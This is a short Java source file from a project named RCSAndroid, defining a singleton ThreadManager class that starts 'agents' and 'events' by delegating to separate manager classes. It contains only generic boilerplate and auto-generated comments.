/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI;

import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.event.EventManager;

// TODO: Auto-generated Javadoc
/**
 * The Class ThreadManager.
 */
public class ThreadManager {

	/** The singleton. */
	private volatile static ThreadManager singleton;

	/** The a manager. */
	private AgentManager aManager;

	/** The e manager. */
	private EventManager eManager;

	/**
	 * Self.
	 * 
	 * @return the thread manager
	 */
	public static ThreadManager self() {
		if (singleton == null) {
			synchronized (ThreadManager.class) {
				if (singleton == null) {
					singleton = new ThreadManager();
				}
			}
		}

		return singleton;
	}

	/**
	 * Instantiates a new thread manager.
	 */
	private ThreadManager() {

	}

	/**
	 * Start agents.
	 */
	public void startAgents() {
		aManager.startAgents();
	}

	/**
	 * Start events.
	 */
	public void startEvents() {
		eManager.startEvents();
	}
}
